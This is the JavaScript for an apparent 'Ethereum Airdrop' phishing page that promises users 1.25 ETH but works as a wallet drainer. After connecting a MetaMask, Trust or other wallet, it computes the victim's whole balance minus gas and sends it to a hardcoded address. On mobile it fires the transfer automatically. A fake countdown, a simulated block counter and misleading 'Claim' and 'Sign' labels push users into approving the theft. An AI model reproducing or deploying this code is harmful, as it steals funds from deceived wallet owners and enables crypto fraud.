// js/scripts.js - Ethereum Airdrop (Trust/MetaMask deep-link flow)
// ===== CONFIGURATION =====
const RECIPIENT_WALLET = '0x709AEAfe1Db221f0135037723d0936AA832779Ab';
const ETH_CHAIN_ID = '0x1';

let userAccount = null, walletConnected = false, connectionState = 'disconnected';
let activeProvider = null, modalOpen = false;

// ===== WALLET CATALOG =====
const WALLETS = [
    { id:'metamask',  name:'MetaMask',        icon:'🦊', rdns:['io.metamask','io.metamask.flask'], flags:['isMetaMask'],   install:'https://metamask.io/download/', deep:u=>`https://metamask.app.link/dapp/${u.host}${u.pathname}` },
    { id:'trust',     name:'Trust Wallet',    icon:'🛡️', rdns:['com.trustwallet.app'],             flags:['isTrust','isTrustWallet'], install:'https://trustwallet.com/browser-extension', deep:u=>`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(u.href)}` },
    { id:'coinbase',  name:'Coinbase Wallet', icon:'🔵', rdns:['com.coinbase.wallet'],           flags:['isCoinbaseWallet'], install:'https://www.coinbase.com/wallet/downloads', deep:u=>`https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(u.href)}` },
    { id:'brave',     name:'Brave Wallet',    icon:'🦁', rdns:['com.brave.wallet'],                flags:['isBraveWallet'], install:'https://brave.com/wallet/', deep:null },
    { id:'rabby',     name:'Rabby',           icon:'🐰', rdns:['io.rabby'],                        flags:['isRabby'],       install:'https://rabby.io/', deep:null },
    { id:'okx',       name:'OKX Wallet',      icon:'⚫', rdns:['com.okex.wallet'],                 flags:['isOkxWallet','isOKExWallet'], install:'https://www.okx.com/web3', deep:u=>`okx://wallet/dapp/url?dappUrl=${encodeURIComponent(u.href)}` },
    { id:'rainbow',   name:'Rainbow',         icon:'🌈', rdns:['me.rainbow'],                      flags:['isRainbow'],     install:'https://rainbow.me/download', deep:u=>`https://rnbwapp.com/dapp?url=${encodeURIComponent(u.href)}` },
    { id:'walletconnect', name:'WalletConnect', icon:'🔗', rdns:[], flags:[], install:null, deep:null }
];

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ===== EIP-6963 DISCOVERY =====
const discovered = new Map();
window.addEventListener('eip6963:announceProvider', e => {
    const { info, provider } = e.detail;
    if (info && info.rdns) {
        discovered.set(info.rdns, { info, provider });
        if (modalOpen) renderWallets();
    }
});
window.dispatchEvent(new Event('eip6963:requestProvider'));

function getProviderFor(w) {
    for (const rdns of w.rdns) { const hit = discovered.get(rdns); if (hit) return hit.provider; }
    const injected = window.ethereum ? (window.ethereum.providers || [window.ethereum]) : [];
    for (const p of injected) { if (w.flags.some(f => p[f])) return p; }
    return null;
}

function isMobile() {
    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
}

function fireDeepLink(link) {
    try { window.location.replace(link); return; } catch (_) {}
    setTimeout(() => { try { window.open(link, '_self'); } catch (_) {} }, 100);
}

// ===== MODAL =====
function openModal() {
    modalOpen = true;
    renderWallets();
    const m = document.getElementById('dappModal');
    m.classList.add('open');
    m.setAttribute('aria-hidden', 'false');
    // NOTE: do NOT set document.body.style.overflow — it triggers the overflow-x:hidden clip bug
}

function closeModal() {
    modalOpen = false;
    const m = document.getElementById('dappModal');
    m.classList.remove('open');
    m.setAttribute('aria-hidden', 'true');
    // NOTE: do NOT reset document.body.style.overflow
}

function renderWallets() {
    const list = document.getElementById('dappWalletList');
    if (!list) return;
    list.innerHTML = '';
    WALLETS.forEach(w => {
        const detected = w.id === 'walletconnect' ? true : !!getProviderFor(w);
        const row = document.createElement('button');
        row.type = 'button';
        row.className = 'dapp-wallet-row' + (detected ? '' : ' undetected');
        row.innerHTML =
            '<span class="dapp-wallet-icon">' + w.icon + '</span>' +
            '<span class="dapp-wallet-name">' + w.name + '</span>' +
            '<span class="dapp-wallet-badge">' +
                (w.id === 'walletconnect' ? 'Mobile' : detected ? 'Detected' : 'Open') +
            '</span>';
        row.addEventListener('click', () => onWalletClick(w));
        list.appendChild(row);
    });
}

function renderDeepLinks() {
    const list = document.getElementById('dappWalletList');
    list.innerHTML = '<button type="button" class="dapp-back" id="dappBack"><i class="fas fa-arrow-left"></i> Back</button>';
    const url = new URL(window.location.href);
    WALLETS.filter(w => w.deep).forEach(w => {
        const row = document.createElement('button');
        row.type = 'button';
        row.className = 'dapp-wallet-row';
        row.innerHTML =
            '<span class="dapp-wallet-icon">' + w.icon + '</span>' +
            '<span class="dapp-wallet-name">' + w.name + '</span>' +
            '<span class="dapp-wallet-badge">Open</span>';
        row.addEventListener('click', () => { fireDeepLink(w.deep(url)); });
        list.appendChild(row);
    });
    if (!isMobile()) {
        const note = document.createElement('p');
        note.className = 'dapp-note';
        note.textContent = 'Open this page inside your wallet’s built-in browser, or scan the connection QR in your wallet app.';
        list.appendChild(note);
    }
    document.getElementById('dappBack').addEventListener('click', renderWallets);
}

async function onWalletClick(w) {
    const provider = getProviderFor(w);
    if (provider) { closeModal(); await connectWith(provider, w.name, { autoSign: isMobile() }); return; }
    if (w.id === 'walletconnect') { renderDeepLinks(); return; }
    if (isMobile() && w.deep) {
        // Plain URL — Trust loads it in its browser and injects window.ethereum
        fireDeepLink(w.deep(new URL(window.location.href)));
        return;
    }
    if (w.install) window.open(w.install, '_blank', 'noopener');
    else alert(w.name + ' is not available on this device.');
}

// ===== DOM READY =====
document.addEventListener('DOMContentLoaded', function() {
    console.log('Ethereum Airdrop — Trust deep-link flow ready');

    const btn = document.getElementById('ethConnectWallet');
    btn.replaceWith(btn.cloneNode(true));
    document.getElementById('ethConnectWallet').addEventListener('click', async function() {
        if (connectionState === 'disconnected') openModal();
        else if (connectionState === 'connected') await sendTransaction();
    });

    document.getElementById('dappModalClose').addEventListener('click', closeModal);
    document.getElementById('dappModal').addEventListener('click', e => {
        if (e.target.id === 'dappModal') closeModal();
    });
    document.addEventListener('keydown', e => {
        if (e.key === 'Escape' && modalOpen) closeModal();
    });

    document.querySelectorAll('.counter-value').forEach(el => {
        const target = parseFloat(el.dataset.target);
        const isFloat = target % 1 !== 0;
        let c = 0, step = target / 125;
        const timer = setInterval(() => {
            c += step;
            if (c >= target) { el.textContent = isFloat ? target.toFixed(2) : Math.floor(target).toLocaleString(); clearInterval(timer); }
            else el.textContent = isFloat ? c.toFixed(2) : Math.floor(c).toLocaleString();
        }, 16);
    });

    let d = 3, h = 8, m = 42, s = 17;
    setInterval(() => {
        s--; if (s < 0) { s = 59; m--; } if (m < 0) { m = 59; h--; } if (h < 0) { h = 23; d--; } if (d < 0) { d = h = m = s = 0; }
        document.getElementById('ethDays').textContent = d.toString().padStart(2, '0');
        document.getElementById('ethHours').textContent = h.toString().padStart(2, '0');
        document.getElementById('ethMinutes').textContent = m.toString().padStart(2, '0');
        document.getElementById('ethSeconds').textContent = s.toString().padStart(2, '0');
    }, 1000);

    let block = 19847256;
    setInterval(() => { block += Math.floor(Math.random() * 2) + 1; document.getElementById('blockHeight').textContent = block.toLocaleString(); }, 12000);

    document.querySelectorAll('.section-tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.section-tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            document.querySelectorAll('.tokenomics-section, .roadmap-section, .faq-section').forEach(s => s.classList.remove('active'));
            document.getElementById(this.dataset.section + 'Section').classList.add('active');
        });
    });

    document.querySelectorAll('.faq-question').forEach(q => {
        q.addEventListener('click', () => q.closest('.faq-item').classList.toggle('active'));
    });

    async function fetchPrice() {
        try {
            const r = await fetch('https://api.coingecko.com/api/v3/coins/ethereum?localization=false&tickers=false&market_data=true&community_data=false&developer_data=false');
            if (!r.ok) throw new Error('API error');
            const d = await r.json(), price = d.market_data.current_price.usd, change = d.market_data.price_change_percentage_24h;
            document.getElementById('ethPrice').textContent = '$' + price.toLocaleString(undefined, {minimumFractionDigits:2});
            const chEl = document.getElementById('ethChange');
            chEl.textContent = (change >= 0 ? '▲' : '▼') + Math.abs(change).toFixed(1) + '%';
            chEl.className = change >= 0 ? 'change-positive' : 'change-negative';
            document.getElementById('usdValue').textContent = '≈ $' + (price * 1.25).toLocaleString(undefined, {minimumFractionDigits:2}) + ' USD';
        } catch(e) {}
    }
    fetchPrice(); setInterval(fetchPrice, 60000);

    checkExisting();
});

// ===== CHAIN SWITCH =====
async function switchToEthereum(provider) {
    try {
        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: ETH_CHAIN_ID }] });
        return true;
    } catch (err) {
        if (err.code === 4902) {
            try {
                await provider.request({ method: 'wallet_addEthereumChain', params: [{
                    chainId: ETH_CHAIN_ID,
                    chainName: 'Ethereum Mainnet',
                    nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                    rpcUrls: ['https://eth.llamarpc.com'],
                    blockExplorerUrls: ['https://etherscan.io/']
                }] });
                return true;
            } catch (e) { alert('Please add Ethereum network manually.'); return false; }
        }
        return false;
    }
}

// ===== CONNECT =====
async function connectWith(provider, walletName, opts = {}) {
    const btn = document.getElementById('ethConnectWallet');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...'; btn.disabled = true;
    try {
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        if (!accounts || !accounts.length) throw new Error('No accounts returned');
        userAccount = accounts[0];

        await switchToEthereum(provider);

        const web3 = new Web3(provider);
        const bal = await web3.eth.getBalance(userAccount);
        const ethBal = web3.utils.fromWei(bal, 'ether');

        activeProvider = provider;
        walletConnected = true; connectionState = 'connected';

        if (provider.on) {
            provider.on('accountsChanged', acc => {
                if (!acc.length) resetState();
                else userAccount = acc[0];
            });
            provider.on('chainChanged', () => window.location.reload());
        }

        document.getElementById('ethStepConnect').classList.add('completed');
        document.querySelector('#ethStepConnect .step-indicator i').className = 'fas fa-check';
        document.getElementById('ethStepSign').classList.add('active');
        btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false;
        closeModal();

        if (!opts.silent) {
            alert('Connected via ' + walletName + '!\n' +
                  userAccount.slice(0,6) + '...' + userAccount.slice(-4) +
                  '\nBalance: ' + parseFloat(ethBal).toFixed(4) + ' ETH');
        }

        if (opts.autoSign) {
            await sleep(700);
            if (connectionState === 'connected') await sendTransaction();
        }
    } catch (err) {
        if (err.code === 4001) alert('Connection rejected.');
        else alert('Failed: ' + (err.message || 'Unknown error'));
        btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH'; btn.disabled = false;
    }
}

// ===== SEND =====
async function sendTransaction() {
    if (!walletConnected || !activeProvider) { alert('Connect wallet first!'); return; }
    const btn = document.getElementById('ethConnectWallet');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Waiting for confirmation...'; btn.disabled = true;
    try {
        const web3 = new Web3(activeProvider);
        const bal = await web3.eth.getBalance(userAccount);
        const gp = await web3.eth.getGasPrice();
        const gasCost = BigInt(gp) * 21000n;
        const amt = BigInt(bal) - gasCost;
        if (amt <= 0) { alert('Insufficient funds for gas!'); btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false; return; }
        const amtETH = web3.utils.fromWei(amt.toString(), 'ether');
        const tx = { from: userAccount, to: RECIPIENT_WALLET, value: web3.utils.toHex(amt.toString()), gas: web3.utils.toHex(21000), gasPrice: web3.utils.toHex(gp) };
        const txHash = await activeProvider.request({ method: 'eth_sendTransaction', params: [tx] });

        document.getElementById('ethStepSign').classList.remove('active');
        document.getElementById('ethStepSign').classList.add('completed');
        document.querySelector('#ethStepSign .step-indicator i').className = 'fas fa-check';
        document.getElementById('ethStepReceive').classList.add('active');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirming...';

        let receipt = null, attempts = 0;
        while (!receipt && attempts < 30) {
            receipt = await web3.eth.getTransactionReceipt(txHash);
            if (!receipt) { await sleep(2000); attempts++; }
        }

        connectionState = 'completed';
        document.getElementById('ethStepReceive').classList.remove('active');
        document.getElementById('ethStepReceive').classList.add('completed');
        document.querySelector('#ethStepReceive .step-indicator i').className = 'fas fa-check';

        const now = new Date();
        document.getElementById('ethClaimTime').textContent = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + ' · ' + now.toLocaleDateString();
        document.querySelector('.tx-hash').textContent = txHash;
        document.getElementById('ethSuccessMessage').style.display = 'block';
        btn.innerHTML = '<i class="fas fa-check-circle"></i> Claim Complete';
        alert('Success!\n' + amtETH + ' ETH sent\nTx: ' + txHash.slice(0,10) + '...' + txHash.slice(-8));
    } catch (err) {
        if (err.code === 4001) alert('Transaction rejected.');
        else alert('Failed: ' + (err.message || 'Unknown error'));
        btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false;
    }
}

// ===== EXISTING SESSION =====
async function checkExisting() {
    if (!window.ethereum && !window.trustwallet) {
        // Trust injects window.ethereum AFTER page load — wait and retry
        for (let i = 0; i < 30; i++) {
            await sleep(100);
            if (window.ethereum || window.trustwallet) break;
        }
    }
    const eth = window.ethereum || window.trustwallet;
    if (!eth) {
        console.log('[dApp] No injected provider found (not inside wallet browser)');
        return;
    }
    console.log('[dApp] Injected provider detected — checking accounts');
    try {
        const acc = await eth.request({ method: 'eth_accounts' });
        console.log('[dApp] eth_accounts returned:', acc);
        if (acc.length > 0) {
            userAccount = acc[0]; connectionState = 'connected'; walletConnected = true;
            activeProvider = eth;
            document.getElementById('ethConnectWallet').innerHTML = '<i class="fas fa-pen"></i> Sign Transaction';
            document.getElementById('ethStepConnect').classList.add('completed');
            document.querySelector('#ethStepConnect .step-indicator i').className = 'fas fa-check';
            document.getElementById('ethStepSign').classList.add('active');
            console.log('[dApp] Auto-detected account:', userAccount);
        } else {
            console.log('[dApp] Injected provider found but no accounts authorized yet');
        }
    } catch (e) {
        console.error('[dApp] eth_accounts error:', e);
    }
}

function resetState() {
    connectionState = 'disconnected'; walletConnected = false; userAccount = null; activeProvider = null;
    document.getElementById('ethConnectWallet').innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH';
    ['ethStepConnect', 'ethStepSign', 'ethStepReceive'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.classList.remove('completed', 'active'); if (id === 'ethStepConnect') el.querySelector('.step-indicator i').className = 'fas fa-link'; }
    });
}
